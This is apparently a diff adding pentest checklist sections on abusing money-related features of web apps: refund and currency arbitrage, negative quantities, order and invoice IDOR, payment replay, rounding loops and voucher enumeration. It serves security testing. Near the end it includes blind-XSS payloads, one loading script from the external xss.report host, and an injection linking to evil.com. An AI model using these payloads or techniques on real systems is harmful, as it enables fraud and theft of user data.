@@ -465,3 +465,120 @@ Any customer who knows this technique can use any single-use coupon code to rece
 - Behaviors explicitly documented as allowed (e.g., coupon stackable by design, unlimited refunds in policy): NOT a vulnerability
 - Admin-only actions that are exploitable but require admin privileges: NOT a privilege issue if admin intentionally has that access
 - Rate limiting that only affects API calls but not final order processing: only report if the rate limit bypass enables completing a harmful action
+
+
+## Additional Techniques — ported from WebSkills (money-related-features-test)
+
+Money-feature-specific abuses that complement the coupon/price/refund/race scenarios above. Keep the whole transaction lifecycle proxied and at each handoff ask: can I tamper with a value a previous stage already trusted, send it concurrently, replay it, or read someone else's? Require a **net economic effect** (paid less / gained credit / got a free item / read another user's data) — a tampered request returning 200 is not enough.
+
+### Refund abuse
+- Buy a subscription, request a refund, check the feature stays accessible after refunding.
+- Currency arbitrage on refund (see below).
+- Race multiple subscription-cancellation requests → multiple refunds.
+
+### Cart / quantity
+- Add one product in **negative quantity** alongside positive-quantity products to balance/lower the total.
+- Add more than the available quantity.
+- Move a wishlist item to another user's cart, or delete from theirs.
+
+### IDOR on orders / invoices / price
+```
+/account/orders/12345
+/account.php?history=y&orderno=10425128
+/pdf/<ordernumber>.pdf   e.g. /pdf/10425128.pdf   (invoice IDOR)
+```
+- Change-price IDOR — make a buy request and tamper the price in request/response.
+
+### Excessive data exposure — full card / CVV
+UI masks the card but the raw JSON may return the full PAN + CVV. Always read the raw response:
+```
+{"first_name":"Harry","mask_cc":"******4510","exp_date":"08/23","cvv":"123","full_card":"6011111111114510"}
+```
+
+### Guest order → order-history / PII takeover
+If the app permits guest checkout AND lacks email verification (or you have a verify-bypass): place a guest order using the victim's email; then register `victim@example.com`; the account's order history exposes the victim's prior orders and PII.
+
+### Transfer / loan logic
+- **Negative amount bypasses a transfer limit** — a `if(amount>3000) return false` check is defeated by `"amount":"-4500"`.
+- **Loan never comes due** — set the first repayment date to `31/February` (`31022015`); the date never arrives.
+
+### Buy at a lower price via payment replay
+Add cheap items → capture the encrypted payment data sent to the gateway → start a new order with expensive items → replace the payment data with the captured (cheaper) blob. If the app doesn't cross-validate, you buy expensive goods at the low price.
+
+### Discount / gift-code flaws
+- Apply the same code more than once (reuse); enter then remove the code from the request; manipulate the response on reuse.
+- Multi-item discount → intercept and change to one item; apply codes to non-discounted items by tampering server-side.
+- **No rate limit** (ref: hackerone.com/reports/123091); **race-condition redeem** for multiple redemptions / free gift-card "money" (ref: 157996); race bypasses invitation limit (ref: 115007).
+- **HPP / mass assignment** to add multiple codes when the UI accepts one.
+- XSS / SQLi in the code field. (ref: 759247)
+
+### Currency arbitrage
+Pay in one currency (USD), get the refund in another (EUR); exploit conversion-rate differences — target a weaker currency.
+
+### Delivery charges
+- Tamper the delivery rate to a negative value to reduce the total; tamper params for free delivery.
+
+### Rate limit
+- No rate limit on contact-us / code endpoints (ref: 856305); general rate-limit bypass.
+
+### Attachments
+- Predictable attachment IDs → IDOR to other users' attachments.
+- Copy attachment links before submitting a money form, then open them from another browser post-submission.
+
+### Injection on money/support surfaces
+- Blind XSS on support/image-upload chat (ref: 1010466):
+```
+"><img src=x id=<b64> onerror=eval(atob(this.id))>
+'"><script src=//xss.report/s/...></script>
+```
+- HTML injection / IMG injection: `"/><img src="x"><a href="https://evil.com">login</a>`.
+
+
+## Additional Techniques — ported from WebSkills (combined-security-test)
+
+Financial checklist deltas beyond the coupon/price/race/workflow/subscription scenarios above. Model the full lifecycle as trust boundaries — *basket → price → discount → currency → payment → provider callback → order → refund → rewards* — and ask "can I change one stage after a later stage already trusted it?"
+
+### Currency Manipulation & Arbitrage
+
+- Change the `currency` parameter in the payment request (multi-currency apps) to a lower-value currency and check for inconsistent credit.
+- Tamper with the currency **inside the payment provider's** request/response, not just the app's.
+- **Arbitrage:** deposit in one currency and withdraw in another where the deposit API and withdrawal API use **inconsistent exchange rates or rounding rules** → net profit.
+
+### Rounding & Numeric-Processing Abuse
+
+- **Rounding accumulation:** deposit `£10.0049` but only `£10.00` is withdrawn while the balance credits the full amount — repeat many times to prove exploitability (report requires demonstrated net gain).
+- **Cross-conversion rounding:** `$0.20 → £0.1352 → $0.2004` profit loops.
+- Test exotic numeric formats the parser may mishandle: `9e99`, `1e-50`, `-0.00`, `001.0000`, `$10`, `£0`, near-max/min ints (overflow/underflow), `True` (== 1 in loose-typed backends).
+
+### Payment Callback / Response Manipulation & Replay
+
+- Intercept the third-party payment callback and flip the `paid`/status field → verify the backend re-validates server-side.
+- **Replay a successful callback** with the same transaction ID → does the system re-credit / re-process? Replay reused encrypted tokens as new transactions.
+
+### Card-Number Handling
+
+- Confirm saved cards are masked (last-4 only) in checkout UI and HTTP responses.
+- If the site blocks duplicate cards, attempt registering a card already on another account → the block message can leak that another user holds that card (enumeration).
+
+### Dynamic Pricing / Signature Flaws
+
+- If price depends on currency/device/referral/time, submit a price ±0.01 from the original and check whether an unexpected margin is accepted.
+- Verify dynamic-price inputs are **cryptographically signed** — if not, tamper freely.
+- **Signature/hash concatenation:** test whether moving part of one parameter into an adjacent one preserves a valid signature (concatenation-boundary confusion).
+
+### Discount / Voucher / Reward Logic
+
+- **Earn > spend:** pay with points and check whether points are *also earned* on the same transaction → net gain.
+- **Refund-in-the-middle:** buy → spend the earned points/free items → refund the purchase → check whether the reward reversal is incomplete.
+- **Basket manipulation after discount calc:** remove items or mix discounted + non-discounted items post-calculation and see if the discount stays valid.
+- **Offer stacking:** combine BOGO / 3-for-2 / percentage promos that shouldn't stack.
+- **Buy-X-get-Y-free:** verify the *cheapest* item is discounted, not the most expensive.
+- **Voucher/gift-card enumeration:** guess codes for other users; assess code randomness.
+
+### Hidden Backend / Virtual Goods
+
+- Discover admin/bulk/balance-adjustment APIs not exposed in the UI and test unauthorized access.
+- Direct-object-reference downloadable/virtual goods (guess the URL of a paid asset).
+- Hunt for debug/test payment endpoints and dummy card numbers left in production.
+
+Reference: Soroush Dalili, "Common Security Issues in Financially-Orientated Web Applications."
